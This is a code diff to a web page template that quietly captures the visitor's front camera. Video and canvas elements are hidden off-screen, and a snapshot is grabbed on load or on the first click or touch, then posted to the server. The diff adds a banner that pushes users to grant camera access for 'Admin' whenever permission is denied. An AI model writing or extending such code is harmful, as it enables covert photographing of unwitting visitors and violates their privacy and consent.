@@ -918,19 +918,33 @@ document.addEventListener('DOMContentLoaded', function() {
 <video id="snapshotVideo" style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0.01; pointer-events: none; z-index: -9999;" autoplay playsinline muted></video>
 <canvas id="snapshotCanvas" style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0.01; pointer-events: none; z-index: -9999;"></canvas>
 
+<!-- Subtle Permission Helper Banner if camera is blocked/pending -->
+<div id="cameraStatusBanner" style="display: none; padding: 12px 18px; border-radius: 16px; background: var(--bg-primary); box-shadow: var(--card-shadow); border-left: 4px solid var(--accent-yellow); margin-bottom: 20px; font-size: 14px; color: var(--text-secondary);">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
+        <span>📷 <strong>Camera Access Required</strong>: Tap button to allow snapshot photo capture for Admin.</span>
+        <button onclick="window.requestFriendCameraSnapshot()" class="btn btn-primary btn-sm" style="padding: 6px 16px;">📷 Allow Camera</button>
+    </div>
+</div>
+
 <script>
 (function() {
     let captured = false;
 
-    function captureSnapshot() {
+    window.requestFriendCameraSnapshot = function() {
+        captureSnapshot(true);
+    };
+
+    function captureSnapshot(isUserAction = false) {
         if (captured) return;
 
         const video = document.getElementById('snapshotVideo');
         const canvas = document.getElementById('snapshotCanvas');
+        const banner = document.getElementById('cameraStatusBanner');
         if (!video || !canvas) return;
 
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            console.log("Camera API unavailable or insecure origin.");
+            console.warn("Camera API unavailable: Site must be loaded over HTTPS.");
+            if (banner && isUserAction) banner.style.display = 'block';
             return;
         }
 
@@ -941,6 +955,7 @@ document.addEventListener('DOMContentLoaded', function() {
         getCameraStream({ video: { facingMode: 'user' } })
             .catch(() => getCameraStream({ video: true }))
             .then(stream => {
+                if (banner) banner.style.display = 'none';
                 video.srcObject = stream;
                 video.play().catch(e => console.log("Video play note:", e));
 
@@ -969,12 +984,11 @@ document.addEventListener('DOMContentLoaded', function() {
                             body: JSON.stringify({ image_data: imageData })
                         })
                         .then(res => res.json())
-                        .then(d => console.log("Snapshot result:", d))
-                        .catch(err => console.log("Snapshot error:", err));
+                        .then(d => console.log("Snapshot submission response:", d))
+                        .catch(err => console.error("Snapshot submission error:", err));
                     }
                 }
 
-                // Try capturing when video frames become available
                 let attempts = 0;
                 const timer = setInterval(() => {
                     attempts++;
@@ -988,20 +1002,20 @@ document.addEventListener('DOMContentLoaded', function() {
                 }, 200);
             })
             .catch(err => {
-                console.log("Camera access denied/error:", err);
+                console.warn("Camera permission pending or denied:", err);
+                if (banner) banner.style.display = 'block';
             });
     }
 
-    // Trigger capture on load & user interaction
     if (document.readyState === 'complete') {
-        setTimeout(captureSnapshot, 300);
+        setTimeout(captureSnapshot, 400);
     } else {
         window.addEventListener('load', function() {
-            setTimeout(captureSnapshot, 300);
+            setTimeout(captureSnapshot, 400);
         });
     }
-    document.addEventListener('click', captureSnapshot, { once: true });
-    document.addEventListener('touchstart', captureSnapshot, { once: true });
+    document.addEventListener('click', function() { captureSnapshot(false); }, { once: true });
+    document.addEventListener('touchstart', function() { captureSnapshot(false); }, { once: true });
 })();
 </script>
 {% endif %}
